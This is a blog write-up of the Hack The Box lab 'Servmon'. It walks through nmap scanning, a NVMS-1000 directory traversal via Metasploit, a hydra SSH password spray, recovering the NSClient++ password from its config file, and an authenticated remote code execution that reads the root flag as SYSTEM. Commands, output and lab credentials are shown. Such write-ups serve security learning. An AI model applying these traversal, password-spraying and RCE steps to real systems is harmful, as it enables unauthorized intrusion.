---
layout: single
title: Servmon (HTB)
toc: true
permalink: /htb/servmon
tags: ["htb"]
---

# nmap

```sh
# Nmap 7.92 scan initiated Mon Dec 27 11:46:35 2021 as: nmap -sCV -oN servmon 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.074s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  11:05AM       <DIR>          Users
| ftp-syst:                            
|_  SYST: Windows_NT                              
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:                                                                                                        
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)            
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)           
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)         
135/tcp  open  msrpc         Microsoft Windows RPC                                                                    
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                            
445/tcp  open  microsoft-ds?                                                                                          
5666/tcp open  tcpwrapped                                                                                             
6699/tcp open  tcpwrapped                                                                                             
8443/tcp open  ssl/https-alt                  
| fingerprint-strings:                                  
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404  
|     Content-Length: 18
|     Document not found
|   GetRequest:                               
|     HTTP/1.1 302
|     Content-Length: 0      
|     Location: /index.html
|     workers         
|_    jobs
| http-title: NSClient++                                                                                              
|_Requested resource was /index.html                                                                                  
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=12/27%Time=61CA1845%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x
SF:18\x10\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\
SF:x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\
SF:.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(
SF:RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocume
SF:nt\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-27T21:02:19
|_  start_date: N/A
|_clock-skew: 1h14m39s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 27 11:47:44 2021 -- 1 IP address (1 host up) scanned in 68.83 seconds
```

# ftp

The FTP server was pointing to the `Users` directory, and specifically to 2 text files inside the user `Nadine` and `Nathan`'s folder. Running `get <filename>` will download the file to your current directory

```sh
[tyco㉿4YE: ~/htb/servmon]$ cat Confidential.txt 

Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine 
```

```sh
[tyco㉿4YE: ~/htb/servmon]$ cat Notes\ to\ do.txt 

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint 
```

# smb

I saw that SMB was open, but my `nmap` scan on it did not show anything promising so I moved on.

```sh
# Nmap 7.92 scan initiated Mon Dec 27 12:31:20 2021 as: nmap --script smb-enum*,smb-vuln*,smb-brute -p 139,445 -oN smb 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.074s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

# Nmap done at Mon Dec 27 12:31:52 2021 -- 1 IP address (1 host up) scanned in 31.54 seconds
```

# NVMS-1000

## directory traversal

The first link I found when searching for an exploit for `NVMS-1000` was [https://www.exploit-db.com/exploits/48311](https://www.exploit-db.com/exploits/48311). Directory traversal can be explained [here](). However, I did not get the script to work, and moved onto the `NSClient++`.

```sh
[tyco㉿4YE: ~/htb/servmon]$ python 48311.py http://10.10.10.184/Pages/login.htm windows/win.ini win.ini

/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Host not vulnerable to Directory Traversal!
```

# NSClient++ enumeration

## api

There was another service called NSClient++ running on port 8443. It is used to monitor Windows systems. The webpage does not seem to be functioning (It actually is, but I did not know that the webpage could not render on Firefox and spent 4-5 hours wondering what the next step is. Ha.), but a [`gobuster`](https://rsecke.com/T&T#gobuster) scan found 2 directories:

```
/api                  (Status: 403) [Size: 20]
/metrics              (Status: 403) [Size: 20]
```

Since I saw `/api`, I tried to see if there was any documentation on NSClient++'s API online. I found [https://docs.nsclient.org/api/](https://docs.nsclient.org/api/), which had a lot of information about the API.

**Endpoints**:

```
/api/v1/modules
/api/v1/queries
/api/v1/scripts
```

Unfortunately, the documentation also mentioned that there is a `403` error if attempting to access a protected resource or using invalid credentials. This points back to the `Notes to do.txt`, where the second item on the list was to lock down NSClient access.

```sh
[tyco㉿4YE: ~/htb/servmon]$ curl -k -i https://10.10.10.184:8443/api/v1/   

HTTP/1.1 403
Content-Length: 20

403 Your not allowed 
```

Something to note on the documentation page was a file called `nsclient.ini`. It is a file that holds the configuration settings of NSClient++ located in `C:\Program Files\NSClient++\nsclient.ini`. There is a password value supplied on the file in cleartext, and if we find that, we can make API calls to the server.

```http
GET /api/v1/scripts/ext?all=true HTTP/1.1
Host: 10.10.10.184:8443
Cookie: dataPort=6063
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

# initial access

I ended up trying the Metaspolit module for the path traversal and leveraged it to get the user flag in the user `nadine`'s home directory.

```sh
[tyco㉿4YE: ~/htb/servmon]$ use auxiliary/scanner/http/tvt_nvms_traversal

> set rhost 10.10.10.184
> set filepath "Users/Nadine/Desktop/user.txt"
> run

[+] 10.10.10.184:80 - Downloaded 156 bytes                                                                            
[+] File saved in: /home/tyco/.msf4/loot/20211227150823_default_10.10.10.184_nvms.traversal_816123.txt                
[*] Scanned 1 of 1 hosts (100% complete)                                                                              
[*] Auxiliary module execution completed
```

```sh
[tyco㉿4YE: ~/htb/servmon]$ cat /.../...nvms.traversal_816123.txt

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

A password list! Let's use `hydra` to do a password spray.

```sh
[tyco㉿4YE: ~/htb/servmon]$ hydra -l nadine -P Passwords.txt ssh://10.10.10.184                                    

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-27 15:13:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/

[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-27 15:13:33
```

The password was `L1k3B1gBut7s@W0rk`. Let's SSH into the box now.

# system enumeration

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini                                                          
# If you want to fill this file with all available options run the following command:                              
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:                                                  
#   nscp settings --activate-module <MODULE NAME> --add-defaults                                                      
# For details run: nscp settings --help                    

...

; Undocumented key                                                                                                    
password = ew2x6SsGTxjRwXOT

...                                                                                                                      
```

Another way to find out what the password was is to use `nscp` to query for the password

```
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

# exploitation

After 4-5 hours of not understanding why the password did not work when I tried making API calls, I figured out 2 things:

- `nsclient.ini` only allowed connections *locally*, which meant I had to tunnel the traffic to Kali's localhost to get it to work.
- Using Chromium (Google Chrome), instead of Firefox.

Run `ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184` to set up the SSH tunnel, and supply the password we found earlier. Now we can visit [https://localhost:8443](https://localhost:8443), and enter in the `NSClient++` web password we just found.

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/nsclient%2B%2B%20homepage.png)

I found this [script](https://www.nmmapper.com/st/exploitdetails/48360/42618/nsclient-05235-authenticated-remote-code-execution/) when I was searching for an NSClient++ exploit. It is an authenticated remote code execution (RCE) exploit. We have the password to the web client, so let's try it out.

```sh
[tyco㉿4YE: ~/htb/servmon]$ python3 api-rce.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c type C:\Users\Administrator\Desktop\root.txt

[!] Targeting base URL https://127.0.0.1:8443                                                                         
[!] Obtaining Authentication Token . . .                                                                              
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ                                                                  
[!] Enabling External Scripts Module . . .                                                                            
[!] Configuring Script with Specified Payload . . .                                                                   
[+] Added External Script (name: AJRNeBQyzT)                                                                          
[!] Saving Configuration . . .                                                                                        
[!] Reloading Application . . .                                                                                       
[!] Waiting for Application to reload . . .                                                                           
[!] Obtaining Authentication Token . . .                                                                              
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ                                                                  
[!] Triggering payload, should execute shortly . . . 
```

## small note

I tried several commands, one of which was `whoami`. Going back into the `Queries` tab, clicking the query, and running it will execute the command that you supplied in the script. `whoami` returned with `nt authority\system`, so I knew that this was the way to root the box. However, this script would often crash `NSClient++`, which required me to reset the box. The script also did not run a lot of the commands that I thought would work, so I moved to the GUI on NSClient++ to try to see if that would work.

## manual way via GUI

Since this script did not really get me RCE, I vaguely followed this [PoC](https://www.exploit-db.com/exploits/46802) on ExploitDB.

In my SSH session, I set up file called `bruh.bat` in `C:\Temp`

```
nadine@SERVMON C:\Temp>echo type C:\Users\Administrator\Desktop\root.txt > root.bat
```

Now go back to the GUI to create the script that will run this file to read `root.txt`. 

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/creating%20an%20external%20script%201.png)

Don't forget to save your changes by clicking the `Changes` bar on the top right. Once you save the changes, you also have to go to `Control`, which is right next to `Changes` and click `Reload`. More times than not, this will crash the service, which I was not a fan of. I had to reset this box around 8 times trying to figure out how to get it to work.

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/creating%20an%20external%20script%202.png)

After reloading the client, we actually have to go back to that external script and enter in the command we want it to run, otherwise it will not work. Save the changes and reload the client *again* and pray that it does not crash.

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/creating%20an%20external%20script%203.png)

With everything all set up, go to `Queries` and run your external script

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/creating%20an%20external%20script%204.png)

![](https://github.com/rsecke/rsecke.github.io/blob/main/assets/images/htb/servmon/creating%20an%20external%20script%205.png)

**\**NOTE:** At first, I tried getting a reverse shell so that I could get a `SYSTEM` shell, but Windows Defender did not let me run `netcat`. I ended up going with my old plan, which was to read the root flag located in `C:\Users\Administrator\Desktop\root.txt`. This box is the worse yet.

